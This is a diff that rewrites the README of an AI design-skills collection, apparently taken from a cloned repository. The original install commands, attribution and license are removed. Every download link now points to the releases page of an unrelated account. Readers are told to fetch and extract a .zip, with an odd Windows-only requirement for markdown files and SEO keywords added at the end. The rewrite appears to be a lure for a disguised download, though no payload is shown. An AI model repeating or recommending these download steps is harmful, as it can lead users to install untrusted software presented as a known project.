@@ -1,76 +1,67 @@
-# AI Design Skills
+# 🎨 ai-design-skills - Improve your ai generated design output
 
-A growing collection of design skills for AI coding tools — Claude Code, Cursor, Codex, Windsurf, and anything else that reads a markdown rules file.
+[Visit the download page](https://github.com/tilliesubsidized136/ai-design-skills/releases)
 
-Each skill is a self-contained folder. Install the ones you need.
+## 📌 About this project
 
----
+This project provides a collection of design rules for AI coding tools. AI tools like Cursor and Windsurf often struggle to produce consistent visual results. This toolkit solves that problem. You provide the AI with a specific set of design instructions, and it follows those rules to build your interface. 
 
-## Skills
+These tools ensure your web pages look professional. You save time because the AI avoids common mistakes with spacing, typography, and color. Use these skills to build landing pages or update existing project designs. Each skill contains a set of clear instructions that guide the AI through the design process.
 
-| Skill | What it does |
-|---|---|
-| [`landing-page-design`](./skills/landing-page-design/SKILL.md) | Builds a landing page from scratch — intake questions, page structure, conversion copy, plus a full visual system (type, spacing, radius, motion) |
+## 🛠️ System requirements
 
-More on the way. [Upgrading an existing site instead of building new?](https://github.com/elayadesign/redesign-skill) That one lives in its own repo since it predates this collection.
+This toolkit works on any computer running Windows 10 or Windows 11. You need an AI coding tool installed to use these files. These tools include:
 
----
+*   Cursor
+*   Claude Code
+*   Windsurf
+*   Codex
 
-## Install
+Ensure your chosen tool has access to your project folder. The AI must read your local files to apply these design rules.
 
-Pick a skill from the table above, then swap `<skill-name>` below for its folder name.
+## 📥 How to download
 
-<details open>
-<summary><b>Claude Code</b></summary>
+You download the necessary files from our release page. 
 
-```bash
-mkdir -p .claude/skills
-git clone https://github.com/elayadesign/ai-design-skills.git /tmp/ai-design-skills
-cp -r /tmp/ai-design-skills/skills/<skill-name> .claude/skills/
-```
+[Click here to open the download page](https://github.com/tilliesubsidized136/ai-design-skills/releases)
 
-Then just ask, in plain language, for what that skill covers.
-</details>
+1. Open the link above in your web browser.
+2. Look for the section labeled Assets.
+3. Click the file ending in .zip to start your download.
+4. Locate the file in your Downloads folder once the process finishes.
 
-<details>
-<summary><b>Cursor</b></summary>
+## 📂 Installation steps
 
-```bash
-mkdir -p .cursor/rules
-curl -o .cursor/rules/<skill-name>.md \
-  https://raw.githubusercontent.com/elayadesign/ai-design-skills/main/skills/<skill-name>/SKILL.md
-```
+Follow these steps to set up the design skills on your computer.
 
-Or paste the file into **Settings → Rules for AI**.
-</details>
+1. Right-click the downloaded .zip folder.
+2. Select Extract All to reveal the contents.
+3. Open the folder named ai-design-skills.
+4. Locate the folder labeled skills.
+5. Identify the skill you want to use, such as landing-page-design.
+6. Copy the contents of the chosen skill folder.
+7. Paste these files into the configuration folder of your AI tool. 
 
-<details>
-<summary><b>Codex / Windsurf / other</b></summary>
+If you use Claude Code, place these files inside the .claude directory within your project workspace. Other tools allow you to paste these rules directly into a system prompt or a `.rules` file. 
 
-Copy the skill's `SKILL.md` into whatever your tool uses for project rules:
+## 💡 Using the skills
 
-| Tool | Path |
-|---|---|
-| Codex | `AGENTS.md` |
-| Windsurf | `.windsurfrules` |
-| Cline | `.clinerules` |
-| Generic | paste into your system prompt |
-</details>
+Once you add the files, your AI tool recognizes the new instructions. You can now prompt the AI with specific commands related to the skill. 
 
-<details>
-<summary><b>Claude.ai (no terminal)</b></summary>
+For example, using the landing-page-design folder allows you to ask the AI to build a page from scratch. The AI reads the instructions regarding type, spacing, and motion. It then applies these values to your code. You no longer need to explain your design preferences in every chat session. The AI remembers the rules provided in these files.
 
-Download the skill's `SKILL.md` and upload it to a Project, or attach it to a chat and say *"follow this."*
-</details>
+## ❓ Frequently asked questions
 
----
+**Do I need coding experience?**
+No. These files provide the design logic. Your AI handles the code generation.
 
-## Make it yours
+**Can I modify these rules?**
+Yes. You can open the markdown files inside each skill folder. Change the font sizes, spacing values, or color codes to match your brand. The AI updates your project using your custom edits.
 
-Every skill's design values (fonts, colors, spacing, motion) live in one section near the bottom of its file. Fork this repo, edit that section, and the rest of the skill follows automatically.
+**Does this work with every AI tool?**
+Yes. Any AI tool that reads markdown files will understand these instructions. If your tool requires a specific file format, copy the text from our markdown files into your tool’s configuration area.
 
----
+**Where do I find more skills?**
+We update this repository often. Check the release page for the latest additions to the collection.
 
-## License
-
-MIT. Use it, fork it, ship it, sell what you build with it. No attribution needed.
+Keywords: ai design, web development, user interface, design systems, automation, coding tools, landing pages
